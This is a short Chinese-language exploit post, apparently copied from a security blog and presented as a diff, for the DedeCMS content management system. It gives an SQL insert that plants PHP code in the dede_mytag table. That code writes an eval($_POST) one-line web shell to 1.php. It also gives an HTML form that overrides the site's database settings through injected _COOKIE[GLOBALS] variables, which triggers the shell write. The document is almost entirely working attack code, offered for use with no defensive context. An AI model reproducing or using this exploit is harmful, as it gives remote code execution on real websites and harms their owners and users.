@@ -1,0 +1,30 @@
+
+前题条件，必须准备好自己的dede数据库，然后插入数据：
+
+ 
+
+insert into dede_mytag(aid,normbody) values(1,'{dede:php}$fp = @fopen("1.php", \'a\');@fwrite($fp, \'<?php eval($_POST[c]) ?>\');echo "OK";@fclose($fp);{/dede:php}');
+
+再用下面表单提交，shell 就在同目录下  1.php。原理自己研究。。。
+
+ 
+
+<form action="" method="post" name="QuickSearch" id="QuickSearch" onsubmit="addaction();">
+<input type="text" value="http://localhost:8080/plus/mytag_js.php?aid=1" name="doaction" style="width:400"><br />
+<input type="text" value="dbhost" name="_COOKIE[GLOBALS][cfg_dbhost]" style="width:400"><br />
+<input type="text" value="dbuser" name="_COOKIE[GLOBALS][cfg_dbuser]" style="width:400"><br />
+<input type="text" value="dbpwd" name="_COOKIE[GLOBALS][cfg_dbpwd]" style="width:400"><br />
+<input type="text" value="dbname" name="_COOKIE[GLOBALS][cfg_dbname]" style="width:400"><br />
+<input type="text" value="dede_" name="_COOKIE[GLOBALS][cfg_dbprefix]" style="width:400"><br />
+<input type="text" value="true" name="nocache" style="width:400">
+<input type="submit" value="提交" name="QuickSearchBtn"><br />
+</form>
+<script>
+function addaction()
+{
+document.QuickSearch.action=document.QuickSearch.doaction.value;
+}
+</script>
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/938.html 
+
+
